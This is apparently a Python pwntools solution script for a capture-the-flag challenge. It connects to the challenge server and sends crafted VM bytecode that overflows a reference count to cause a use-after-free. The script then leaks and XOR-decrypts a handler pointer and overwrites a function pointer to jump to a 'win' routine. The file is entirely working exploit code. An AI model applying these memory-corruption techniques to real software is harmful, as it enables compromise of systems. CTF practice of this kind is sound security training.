from pwn import *
import struct

exe = './chal'
elf = ELF(exe, checksec=False)
context.binary = elf

OFFSET_SAFE_HANDLER = 0x1283
OFFSET_WIN          = 0x129d
PAC_KEY             = 0x1a5bfe810dce5825

INS_MOV_IMM = b'\x01'
INS_SYS     = b'\x06'

def mov(reg, val): 
    return INS_MOV_IMM + bytes([reg]) + p32(val)

def syscall(sys_num, arg1=0, arg2=0, arg3=0):
    p = mov(0, sys_num)
    p += mov(1, arg1) + mov(2, arg2) + mov(3, arg3)
    p += INS_SYS
    return p

def refcount_overflow(obj_id):
    p = syscall(9, arg1=obj_id) 
    
    for _ in range(127):
        p += mov(0, 4)
        p += mov(1, obj_id)
        p += INS_SYS
    return p

def pwn():
#    p = process(exe)
    p = remote("tervimator.ctf.prgy.in", 1337)

    bytecode = b""
    #alloc_exec safe_handler
    bytecode += syscall(2, arg1=0) 
    
    bytecode += refcount_overflow(0)
    
    #sys_free
    bytecode += syscall(3)
    
    #sys_name() arg2 = len
    bytecode += syscall(5, arg1=0, arg2=9)
    
    # sys_read() arg1 = ID, arg2 offset 
    for i in range(8):
        bytecode += syscall(7, arg1=0, arg2=i)

    #allocate ID 0 
    bytecode += syscall(1, arg1=16)
    
    #alloc_exec ID->1
    bytecode += syscall(2, arg1=0)
    #    overwrite ID->1 with sys_read
    bytecode += syscall(5, arg1=0, arg2=64)
    
    # sys_exec ID 1
    bytecode += syscall(8, arg1=1)

    p.send(bytecode)


    p.recvuntil(b"Reading 9 bytes")
    p.send(b"A"*8 + b"\x01")

    #get sys_read data 
    leak_data = b""
    for _ in range(8):
        p.recvuntil(b"Byte at")
        line = p.recvline().strip()
        byte_hex = line.split(b": ")[1]
        leak_data += bytes([int(byte_hex, 16)])

    encrypted_leak = struct.unpack("<Q", leak_data)[0]
    safe_handler   = encrypted_leak ^ PAC_KEY
    
    #decrypt address 
    base_addr     = safe_handler - OFFSET_SAFE_HANDLER
    win_addr      = base_addr + OFFSET_WIN
    encrypted_win = win_addr ^ PAC_KEY

    log.success(f"Leaked Pointer: {hex(safe_handler)}")
    log.success(f"Binary Base:    {hex(base_addr)}")
    log.success(f"Target Win:     {hex(win_addr)}")

    #overwrite id 1
    p.recvuntil(b"Reading 64 bytes")
    
    payload = b"A" * 24
    
    payload += b"AAAAAAAA" 
    payload += b"\x07"    
    payload += b"\x02"   
    payload += b"\x01"  
    payload += b"\x00" 
    payload += p32(0) 
    payload += p64(encrypted_win) 

    payload = payload.ljust(64, b"\x00")
    
    p.send(payload)

    p.interactive()

if __name__ == "__main__":
    pwn()

